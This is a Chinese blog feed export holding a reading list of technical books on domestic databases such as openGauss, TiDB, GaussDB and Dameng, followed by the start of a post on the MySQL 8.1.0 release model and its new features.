<p><a class="link"   href="http://www.cmpedu.com/books/book/5605300.htm" >华为openGauss开源数据库实战 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
中国产业发展研究院 著<br>
出版社： 机械工业出版社<br>
ISBN： 9787111680154<br>
出版时间：2021-07-01</p>
<ul>
<li>内容介绍</li>
</ul>
<p>本书是一本指导读者快速步入华为openGauss开源数据库世界的实战指导书。本书由30个实战任务构成：前三个任务是搭建openGauss数据库的实验环境；任务四是openGauss的简单维护；任务五是准备测试数据集；任务六是学习使用openGauss DBMS的客户端工具gsql；任务七到任务二十七则涵盖了openGauss DBMS的方方面面；任务二十八和任务二十九是关系数据库设计的实战；任务三十是搭建openGauss主备数据库以及主备数据库的管理。</p>
<img  alt="b07.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230721-f441b5b6-c785-46fe-8df9-38972f01216a.jpg"
                      width=450px referrerpolicy="no-referrer"
                >
<h3 id="🇩-openGauss数据库核心技术">🇩 openGauss数据库核心技术</h3>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="http://www.tup.tsinghua.edu.cn/booksCenter/book_08705001.html" >openGauss数据库核心技术 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
李国良，周敏奇 著<br>
出版社： 清华大学出版社<br>
ISBN：9787302554530<br>
出版时间：2020-07-01</p>
<ul>
<li>内容介绍</li>
</ul>
<p>本书系统论述了openGauss数据库理论、技术及应用。本书共11章,首先介绍数据库发展历史,包括传统的网状数据库、层次数据库、关系数据库、NoSQL数据库、NewSQL数据库、云数据库、多模数据库、分布式数据库等。其次介绍结构化查询语言(SQL)、SQL语法、存储过程、触发器、游标、数据库设计规范和E-R 模型等数据库基础知识。再次介绍数据库未来发展趋势,包括新硬件、不同部署形态、新应用对数据库的影响。最后重点介绍openGauss的核心技术,包括openGauss的核心架构、面向鲲鹏和昇腾等新硬件的优化技术、SQL引擎、执行器技术、数据库存储技术、数据库事务机制、数据库安全、数据库自治技术等。</p>
<img  alt="b08.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230721-aa8f0bf3-f041-47c1-9b62-094d7df835ac.jpg"
                      width=450px referrerpolicy="no-referrer"
                >
<h3 id="🇪-全国计算机等级考试二级教程——openGauss数据库程序设计">🇪 全国计算机等级考试二级教程——openGauss数据库程序设计</h3>
<p><a class="link"   href="https://www.modb.pro/db/222595" >2022年全国计算机等级考试新增《二级openGauss数据库程序设计》 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。作为全国计算机等级考试的配套书籍，openGauss数据库程序设计，目前已出版两本，蓝皮书和绿皮书，区别在于<a class="link"   href="http://www.hep.com.cn/book/show/ab83e2e8-c506-427e-ad7d-d354d31460aa" >蓝皮书 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>是2022年版，<a class="link"   href="http://www.hep.com.cn/book/show/9b2b6897-58e8-480a-a886-d8359511b5e3" >绿皮书 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>是2023年新版。</p>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="http://www.hep.com.cn/book/show/9b2b6897-58e8-480a-a886-d8359511b5e3" >全国计算机等级考试二级教程——openGauss数据库程序设计 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
作者： 教育部教育考试院<br>
ISBN： 978-7-04-058018-1<br>
出版时间： 2022-02-28</p>
<ul>
<li>内容介绍</li>
</ul>
<p>本教材为全国计算机等级考试二级openGauss 数据库程序设计而编写,全书分为9 章,包括数据库基础､openGauss 概述､openGauss 应用基础､openGauss 数据库的管理､数据定义与数据操作､数据查询､openGauss 数据库编程､openGauss 数据库安全管理以及openGauss 数据库事务管理与备份恢复等内容｡</p>
<img  alt="b09.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230721-0252d383-60b7-4dda-8f3f-a92e66575284.png"
                      width=450px referrerpolicy="no-referrer"
                >
<h2 id="3️⃣-TiDB">3️⃣ TiDB</h2>
<p>7 月 13 日，<a class="link"   href="https://www.modb.pro/db/1680838742670663680" >PingCAP 用户峰会 2023 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 在北京西南华邑酒店成功举办。 本次峰会上，正式发布了【平凯数据库】。</p>
<blockquote>
<p>平凯数据库基于 TiDB Open Core 提供增强型企业级功能，提升国产化需求的收集、研发和交付速度，提供更多元的企业级服务支持方案，以更完善的国产化生态降低中国用户升级数据基础设施的成本和复杂性。</p>
</blockquote>
<p>TiDB 提供两个版本系列，最新版本为，长期支持版本 (LTS) TiDB 7.1 和 开发里程碑版本(DMR) TiDB 7.2，更多内容请参阅 <a class="link"   href="https://docs.pingcap.com/zh/" >PingCAP 文档中心 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>关于 TiDB 的书推荐两本，第一本是 <a class="link"   href="https://www.modb.pro/db/489961" >2022 年 PingCAP 用户峰会 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>上发布的图书 《与开源同行：揭秘PingCAP七年创业实践》，第二本是去年 7 月发布的电子书 《TiDB 6.x in Action》。</p>
<h3 id="🇦-与开源同行：揭秘PingCAP七年创业实践">🇦 与开源同行：揭秘PingCAP七年创业实践</h3>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="https://www.ptpress.com.cn/shopping/buy?bookId=474c3f82-fa80-4ffe-86d3-c95ca8fc517f" >与开源同行：揭秘PingCAP七年创业实践 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
平凯星辰 著<br>
出版社： 人民邮电出版社<br>
ISBN： 9787115593801<br>
出版时间：2022-10-01</p>
<ul>
<li>内容介绍</li>
</ul>
<p>本书融入了PingCAP公司在开源领域的七年探索经验，以及在分布式数据库领域的研究成果，对开源的历史发展、分布式数据库的变迁演进、TiDB的框架设计、应用实践以及开源与商业化的连接进行了深入剖析。<br>
开篇首先以PingCAP公司的创业故事为主线，讲述公司为何选择开源作为核心战略，以及主要产品TiDB的研发、运营和国际化历程。然后介绍PingCAP在成长为国内开源厂商的探索者的过程中，在技术路线选择和社区生态中的重要贡献和发展经验。最后介绍了PingCAP对未来基础软件的技术、开源趋势的思考与展望。全书以从参与者到贡献者再到探索者的视角，细致而全面地讲述了关于开源技术和开源文化对于当代技术驱动型企业的生存与发展的重要意义和影响。<br>
本书适合所有技术驱动型的企事业成员，以及正在学习、已经从业或有志于投入IT产业的广大读者阅读。</p>
<img  alt="b10.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230721-14bfece5-f642-4b1e-a5b9-4227da7125e0.jpg"
                      width=450px referrerpolicy="no-referrer"
                >
<h3 id="🇧-TiDB-6-x-in-Action">🇧 TiDB 6.x in Action</h3>
<p>从 2022 年 4 月到 7 月，TiDBer 们一起在社区共创完成了《TiDB 6.x in Action》，这本书分为 TiDB 6.x 原理和特性、TiDB Developer 体验指南、TiDB 6.x 可管理性、TiDB 6.x 内核优化与性能提升、TiDB 6.x 测评、TiDB 6.x 最佳实践 6 大内容模块，汇聚了 TiDB 6.x 新特性的介绍、测评、试用心得等等干货，欢迎阅读指正。</p>
<p>电子书直达链接： <a class="link"   href="https://tidb.net/book/book-rush" >TiDB 6.x in Action <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<img  alt="b11.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230721-5de58db5-9076-4ce0-9de1-c64999b4f67b.jpeg"
                      width=450px referrerpolicy="no-referrer"
                >
<h2 id="4️⃣-GaussDB">4️⃣ GaussDB</h2>
<p>GaussDB是华为自主创新研发的分布式关系型数据库。该产品支持分布式事务，同城跨AZ部署，数据0丢失，支持1000+的扩展能力，PB级海量存储。同时拥有云上高可用，高可靠，高安全，弹性伸缩，一键部署，快速备份恢复，监控告警等关键能力，能为企业提供功能全面，稳定可靠，扩展性强，性能优越的企业级数据库服务。</p>
<p>最早GaussDB内核引擎基于PostgreSQL9.2开源版本不断演进，根据PG-XC架构演生了多CN架构，主要开发了分布式执行框架（stream算子）、向量化引擎等领域中较重要的特性。目前GaussDB除去保留了PostgreSQL的标准接口和公共函数外，在自研生态（openGauss）、架构和关键技术上也有了新的发展，开源了集中式部署的能力，重构了存储引擎和优化器。</p>
<p>更多内容请参阅： <a class="link"   href="https://support.huaweicloud.com/opengauss/index.html" >云数据库 GaussDB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="🇦-数据库原理及应用实验——基于GaussDB的实现方法">🇦 数据库原理及应用实验——基于GaussDB的实现方法</h3>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="http://www.tup.tsinghua.edu.cn/booksCenter/book_09040201.html" >数据库原理及应用实验——基于GaussDB的实现方法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
出版社： 清华大学出版社<br>
ISBN： 9787302605997<br>
出版时间：2022-09-01</p>
<ul>
<li>内容介绍</li>
</ul>
<p>本实验指导教程可以结合《数据库原理及应用——基于GaussDB的实现方法》（ISBN为 9787302580850）使用。本书基于GaussDB(for MySQL)云数据库环境，以一个实际的数据库应用系统为主线，将数据库系统开发项目情景引入课程，在运用计算机进行数据处理的过程中，将有关数据采集、整理、存储、分类、排序、检索、维护、加工、统计和传输等一系列操作过程的知识和技术，设计为分知识点、分层级和分难易的数据库实验案例，力图以其提供的知识体系和实验体系为主线，着力培养学生和读者用户分析问题和解决问题的能力。学习者在近似于实际项目开发过程的情景下完成相关任务，体验相对完整的软件开发过程，理解软件工程的基本思想和方法，进而加强对主教材内容的掌握和实操训练，实现讲授与学习的目标。</p>
<img  alt="b12.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230721-3a97ea25-35c5-4d5a-8940-82f5ac2e9a07.jpg"
                      width=450px referrerpolicy="no-referrer"
                >
<h3 id="🇧-数据库原理及应用——基于GaussDB的实现方法">🇧 数据库原理及应用——基于GaussDB的实现方法</h3>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="http://www.tup.tsinghua.edu.cn/booksCenter/book_09040301.html" >数据库原理及应用——基于GaussDB的实现方法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
出版社： 清华大学出版社<br>
ISBN： 9787302580850<br>
出版时间：2021-08-01</p>
<ul>
<li>内容介绍</li>
</ul>
<p>本书的特点在于将数据库基本原理知识与GaussDB(for MySQL)数据库管理系统的技术知识融合在一起，是以GaussDB(for MySQL)为平台的数据库原理与技术教程，也是从数据库基本概念入手的GaussDB(for MySQL)数据库管理系统入门教程。本书讲解了数据库基本概念、数据库设计、数据库组织与管理、数据库SQL查询语言、数据库系统控制，以及数据库应用系统开发的一般方法，同时也介绍了GaussDB(for MySQL)云数据库的特性、架构及工作原理等几个方面的内容。每章都通过翔实的基础知识和简明的操作步骤，将知识点和实际应用相结合，帮助读者理解和掌握数据库原理和数据库操作。</p>
<img  alt="b13.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230721-07d69dc0-1d77-4d61-8bc8-e31f783c8350.jpg"
                      width=450px referrerpolicy="no-referrer"
                >
<h2 id="5️⃣-达梦">5️⃣ 达梦</h2>
<p>达梦数据库管理系统（DM8） 的官方主页： <a class="link"   href="https://www.dameng.com/DM8.html" >https://www.dameng.com/DM8.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="🇦-DM8数据中心解决方案——达梦实时同步工具">🇦 DM8数据中心解决方案——达梦实时同步工具</h3>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="https://www.phei.com.cn/module/goods/wssd_content.jsp?bookid=61306" >DM8数据中心解决方案——达梦实时同步工具 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
作译者：徐飞 等<br>
出版时间：2022-09<br>
ISBN：9787121441769</p>
<h3 id="🇧-达梦数据库性能优化">🇧 达梦数据库性能优化</h3>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="https://www.phei.com.cn/module/goods/wssd_content.jsp?bookid=60344" >达梦数据库性能优化 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
曾昭文 等 著<br>
出版社： 电子工业出版社<br>
ISBN： 9787121431135<br>
出版时间：2022-04-01</p>
<h3 id="🇨-达梦数据库集群">🇨 达梦数据库集群</h3>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="https://www.phei.com.cn/module/goods/wssd_content.jsp?bookid=59466" >达梦数据库集群 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
作译者：文峰,付铨 等<br>
出版时间：2021-12<br>
ISBN：9787121424540</p>
<h3 id="🇩-达梦数据库应用基础（第二版）">🇩 达梦数据库应用基础（第二版）</h3>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="https://www.phei.com.cn/module/goods/wssd_content.jsp?bookid=59518" >达梦数据库应用基础（第二版） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
作译者：张海粟,朱明东 等<br>
出版时间：2021-11<br>
ISBN ：9787121424335</p>
<h3 id="🇪-达梦数据库编程指南">🇪 达梦数据库编程指南</h3>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="https://www.phei.com.cn/module/goods/wssd_content.jsp?bookid=59400" >达梦数据库编程指南 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
作译者：戴剑伟,张守帅 等<br>
出版时间：2021-11<br>
ISBN： 9787121423628</p>
<h3 id="🇫-达梦数据库运维实战">🇫 达梦数据库运维实战</h3>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="https://www.phei.com.cn/module/goods/wssd_content.jsp?bookid=58705" >达梦数据库运维实战 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
作译者：张守帅,戴明明<br>
出版时间：2021-08<br>
ISBN： 9787121417016</p>
<h3 id="🇬-DM8数据中心解决方案――达梦数据交换平台">🇬 DM8数据中心解决方案――达梦数据交换平台</h3>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="https://www.phei.com.cn/module/goods/wssd_content.jsp?bookid=57696" >DM8数据中心解决方案――达梦数据交换平台 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
作译者：张胜,梅纲<br>
出版时间：2021-02<br>
ISBN ： 9787121381119</p>
<h2 id="6️⃣-GBase">6️⃣ GBase</h2>
<p>GBASE 是南大通用自主研发的国产数据库系列品牌，GBase 系列数据库产品包括：分布式逻辑数据仓库 GBase 8a、基于共享存储的数据库集群 GBase 8s、多模多态分布式数据库 GBase 8c 等。</p>
<h3 id="🇦-数据库原理和实践教程-GBase-8t-Based-on-Informix剖析与应用">🇦 数据库原理和实践教程 GBase 8t Based on Informix剖析与应用</h3>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="https://www.phei.com.cn/module/goods/wssd_content.jsp?bookid=44413" >数据库原理和实践教程 GBase 8t Based on Informix剖析与应用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
袁晓洁，孙国荣 编<br>
出版社： 电子工业出版社<br>
ISBN： 9787121277306<br>
出版时间：2015-12-01</p>
<ul>
<li>内容介绍</li>
</ul>
<p>GBase 8t 是南大通用推出的一款具有世界领先水平的关系数据库管理系统，其原型系统 Informix 已经被广泛应用于金融、电信、企业和政府等各领域。 本书在系统介绍数据库理论知识的基础上， 结合 GBase 8t 产品实例，深入剖析了商业数据库的架构和核心技术。<br>
作者既有南大的教授，又有 GBase 8t 核心技术工程师，真正是产学结合，一本书能够把数据库从原理到实践都学透，理论结合实践，提高实战技能。</p>
<img  alt="b14.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230721-e3d9bc01-b139-43e8-bf35-aeab6e70ea24.jpg"
                      width=450px referrerpolicy="no-referrer"
                >
<h2 id="7️⃣-AntDB">7️⃣ AntDB</h2>
<p><a class="link"   href="https://www.modb.pro/wiki/55" >AntDB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 数据库始于 2008 年，隶属于亚信科技旗下通用型企业级数据库产品，在运营商的核心系统上，为全国 24 个省份的 10 亿多用户提供在线服务。</p>
<p>AntDB 分为两款数据库产品： AntDB-T 交易型数据库，大规模应用于通信、金融等核心交易系统； AntDB-M 内存数据库，更高效，全内存态运行的关系型数据库。更多产品信息，参见<a class="link"   href="http://www.antdb.net/72_product" >官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<h3 id="🇦-分布式数据库架构设计与实践">🇦 分布式数据库架构设计与实践</h3>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="http://www.tup.tsinghua.edu.cn/bookscenter/book_09429301.html" >分布式数据库架构设计与实践 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
亚信科技（中国）有限公司 著<br>
出版社： 清华大学出版社<br>
ISBN： 9787302616306<br>
出版时间：2022-09-01</p>
<ul>
<li>内容介绍</li>
</ul>
<p>分布式数据库架构全面解析，“去O”实践经验分享，详解国产优秀数据库AntDB<br>
本书第 1、2 章介绍数据库的发展史和现状，讲述分布式数据库的架构，带读者从整体上认识分布式数据库。第 3~5 章着重介绍 AntDB 数据库，对其分布式架构、存储引擎和事务机制等方面进行较为详细的介绍，并且结合实际案例进行说明。第 6、7 章主要介绍分布式数据库的高可用性方案，以及线下实际应用案例，并对高可用性方案的设计进行说明，同时对分布式数据库技术未来的发展进行展望。</p>
<img  alt="b15.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230721-e57cb486-9f0c-45b9-8492-b0a08c0b42d5.jpg"
                      width=450px referrerpolicy="no-referrer"
                >
<h2 id="8️⃣-Doris">8️⃣ Doris</h2>
<p><a class="link"   href="https://www.modb.pro/wiki/968" >Apache Doris <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是一个基于MPP的现代化、高性能、支持实时的分析型数据库。Apache Doris 最早是诞生于百度广告报表业务的 Palo 项目，2017 年正式对外开源，2018 年 7 月由百度捐赠给 Apache 基金会进行孵化，之后在 Apache 导师的指导下由孵化器项目管理委员会成员进行孵化和运营。官方文档： <a class="link"   href="https://doris.incubator.apache.org/zh-CN/docs/dev/summary/basic-summary/" >Doris 介绍 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="🇦-Doris实时数仓实战">🇦 Doris实时数仓实战</h3>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="https://item.jd.com/13738563.html" >Doris实时数仓实战 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
作者： 王春波<br>
ISBN： 9787111726319<br>
出版时间： 2023-05-01<br>
出版社： 机械工业出版社</p>
<ul>
<li>内容介绍</li>
</ul>
<p>这是一本从基本操作、架构设计、进阶使用、运维管理、拓展应用、项目实战等多个维度全面讲解Doris的著作，是资深数据仓库专家兼Doris开源项目贡献者实战经验的总结，得到了Apache Doris PMC主席、Select DB创始人兼CEO以及多位Apache Doris PMC的强烈推荐。通过本书，读者不仅能零基础快速掌握Doris的原理和使用，还能获得搭建离线/在线实时数仓的项目实战经验。</p>
<img  alt="b16.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230721-08f8b45f-b710-496b-b6c4-55f272ad11f1.jpg"
                      width=450px referrerpolicy="no-referrer"
                >
<h2 id="9️⃣-SequoiaDB">9️⃣ SequoiaDB</h2>
<p><a class="link"   href="https://www.modb.pro/wiki/31" >巨杉数据库 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 自2011年成立以来，专注数据库技术研发，坚持从零开始打造原生分布式数据库引擎，连续三年入榜 Gartner报告，成为当前新一代主流数据库体系的灯塔厂商。官方文档： <a class="link"   href="https://doc.sequoiadb.com/cn/sequoiadb-cat_id-1558957223-edition_id-306" >SequoiaDB 简介 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="🇦-SequoiaDB分布式数据库权威指南">🇦 SequoiaDB分布式数据库权威指南</h3>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="https://www.phei.com.cn/module/goods/wssd_content.jsp?bookid=59402" >SequoiaDB分布式数据库权威指南 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
许建辉 等 著<br>
出版社： 电子工业出版社<br>
ISBN： 9787121422911<br>
出版时间： 2021-12-01</p>
<ul>
<li>内容介绍</li>
</ul>
<p>本书从分布式数据库的背景与发展情况出发，详细、系统地介绍了国产分布式数据库SequoiaDB（巨杉数据库）的基础知识、数据库实例、架构原理、运维管理等核心技术内容，提供了性能调优和问题诊断的基本思路。此外，书中还分享了SequoiaDB的行业应用、最佳实践、工具和生态等内容。</p>
<img  alt="b17.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230721-04d34c90-9c55-42b3-82ad-e9dbf6e88687.jpg"
                      width=450px referrerpolicy="no-referrer"
                >
<h2 id="🔟-HighgoDB">🔟 HighgoDB</h2>
<p><a class="link"   href="https://www.modb.pro/wiki/36" >瀚高数据库 (HighgoDB) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 引进了国际上最先进的开源数据库 PostgreSQL 内核技术，在此 PostgreSQL 社区版之上做了一系列的研发和优化。瀚高科技是中国最早致力于 PostgreSQL 数据库商业推广使用的专业化公司，在数据库方面有着丰富的开发、管理和培训经验。官方文档：<a class="link"   href="https://docs.highgo.com/" >瀚高 Docs <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="🇦-瀚高数据库实战指南">🇦 瀚高数据库实战指南</h3>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="https://item.jd.com/13174229.html" >瀚高数据库实战指南 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
苗健，丁召华 著<br>
出版社： 济南出版社<br>
ISBN：9787548851387<br>
出版时间：2022-05-01</p>
<ul>
<li>内容介绍</li>
</ul>
<p>本书由浅入深、循序渐进向广大瀚高数据库维护人员、应用开发人员及国产化软件的爱好者全面地介绍瀚高数据库的使用方法和技巧。本书共分上下两篇，上篇（运维篇）主要针对数据库管理人员，包括数据库安装部署、备份管理、日常维护等；下篇（适配开发篇）主要用于指导应用程序开发人员基于瀚高数据库进行开发，指导读者高效完成从国外数据库如 Oracle、Mysql、PostgreSQL 向国产化数据库迁移的工作。</p>
<img  alt="b18.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230721-799ce62d-e430-47bd-904d-c583f666edfa.png"
                      width=450px referrerpolicy="no-referrer"
                >
<h2 id="总结">总结</h2>
<p>本文统共收录了 10 款国产数据库的 24 本技术书，其中部分书籍已经上架了<a class="link"   href="https://www.modb.pro/point/mall" >墨值商城 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，如有需求可以兑换。😄<br>
要相信正规出版物的高质量审校工作，这可以大幅降低我们学习技术的时间成本。✈️<br>
当然，技术书籍也有天然“漏洞”，就是书中的技术点可能存在时效性问题，所以我在文中也补充了官方文档链接。</p>
<p>由于信息获取渠道有限，如有遗漏，欢迎留言补充，感谢！</p>
<p>先酱，祝君开卷有益。📚</p>
<p>2023-07-21<br>
@严少安</p>
<p>End.</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/1682292038413918208" >https://www.modb.pro/db/1682292038413918208 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>清单</category>
      </categories>
      <tags>
        <tag>gbase</tag>
        <tag>oceanbase</tag>
        <tag>opengauss</tag>
        <tag>book</tag>
        <tag>国产数据库</tag>
        <tag>tidb</tag>
        <tag>antdb</tag>
        <tag>书单</tag>
      </tags>
  </entry>
  <entry>
    <title>【MySQL 8.x】重磅！MySQL 8.1.0 已来！有彩蛋~</title>
    <url>/2023/mysql/mysql-8.1.0-release/</url>
    <content><![CDATA[<h2 id="🆙-MySQL-8-1-0-社区版发布">🆙 MySQL 8.1.0 社区版发布</h2>
<p>今天（2023-07-18），MySQL 8.1.0 发布，这是 MySQL 变更发版模型后的第一个创新版本 (Innovation Release) 。</p>
<img  alt="1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230718-58ab4384-b8f9-4476-855d-f1190aa445f1.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="📢-发版模型">📢 发版模型</h2>
<p>LTS 版本将遵循 Oracle Lifetime Support Policy，其中包括 5 年首要支持和 3 年扩展支持。 创新版本将被支持，直到下一个主要和次要版本发布。</p>
<p>MySQL 产品组合中的大多数产品都将具有创新和 LTS 版本：</p>
<ul>
<li>MySQL Server、MySQL Shell、MySQL Router、MySQL NDB Cluster 将发布创新版和 LTS 版。</li>
<li>MySQL Operator for Kubernetes、InnoDB ReplicaSet、Cluster 和 ClusterSet 将发布创新和 LTS 版本。</li>
<li>MySQL 连接器将使用最新版本，但将被视为普遍可用 (GA)，并将与所有受支持的 MySQL 服务器版本保持兼容。</li>
<li>MySQL Workbench 将保留在 8.0.x 上并普遍可用 (GA)，并将与所有受支持的 MySQL Server 版本保持兼容。</li>
</ul>
<img  alt="2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230719-1973419d-f6a9-4397-aacd-f16880c10823.png"
                      referrerpolicy="no-referrer"
                >
<p>大约每 2 年，一个次要版本将被指定为长期支持版本 (LTS)。 该版本将提供 5 年优先支持和 3 年扩展支持，与之前支持的版本相同。 这与 MySQL 5.7 及之前的版本类似。</p>
<p>LTS 也将是主要版本的最后一个版本。 下一个（创新）版本将增加主版本号。 例如，如果 MySQL 8.4.0 是 8.x LTS 版本，那么 MySQL 9.0 将是下一个创新版本。</p>
<h2 id="🥳-MySQL-8-1-新增特性">🥳 MySQL 8.1 新增特性</h2>
<h3 id="捕获-EXPLAIN-FORMAT-JSON-输出">捕获 <code>EXPLAIN FORMAT=JSON</code> 输出</h3>
<p>这个版本扩展了 <code>EXPLAIN FORMAT=JSON</code> 的 <code>INTO</code> 选项，它提供了在一个用户变量中存储 <code>JSON</code> 格式的 <code>EXPLAIN</code> 输出的能力，在这个用户变量中，它可以使用 MySQL JSON 函数来工作，像这样:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> EXPLAIN FORMAT<span class="operator">=</span>JSON <span class="keyword">INTO</span> <span class="variable">@myex</span> <span class="keyword">SELECT</span> name <span class="keyword">FROM</span> a <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> JSON_EXTRACT(<span class="variable">@myex</span>, &quot;$.query_block.table.key&quot;);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> JSON_EXTRACT(<span class="variable">@myex</span>, &quot;$.query_block.table.key&quot;) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> &quot;PRIMARY&quot;                                      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure></div>
<img  alt="3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230718-053808ce-4da9-4806-ad73-56d07e5d70b0.png"
                      referrerpolicy="no-referrer"
                >
<p>这个选项仅在 <code>EXPLAIN</code> 语句也包含 <code>FORMAT=JSON;</code> 时才能试用，否则，将导致语法错误。这不受 <a href="https://dev.mysql.com/doc/refman/8.1/en/server-system-variables.html#sysvar_explain_format"><code>explain_format</code></a> 的值影响。</p>
<p><code>INTO</code> 可以用于任何执行计划语句，但 <code>EXPLAIN FOR CONNECTION</code> 除外。它不能与 <code>EXPLAIN ANALYZE</code> 一起使用。</p>
<h3 id="客户端保留注释">客户端保留注释</h3>
<p>之前的版本中，MySQL 客户端默认剥离注释。在 MySQL 8.1 中，默认情况已更改为保留此类注释。</p>
<blockquote>
<p>mysql 客户端的 <a href="https://dev.mysql.com/doc/refman/8.1/en/mysql-command-options.html#option_mysql_comments"><code>-c, --comments</code></a> 参数默认为 on。</p>
</blockquote>
<p>要像以前版本的 MySQL 那样执行注释剥离，需要给 MySQL 客户端传参 <a href="https://dev.mysql.com/doc/refman/8.1/en/mysql-command-options.html#option_mysql_comments"><code>--skip-comments</code></a>。</p>
<img  alt="4.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230718-3f262e52-dbd8-4630-9175-d164508f76b7.png"
                      referrerpolicy="no-referrer"
                >
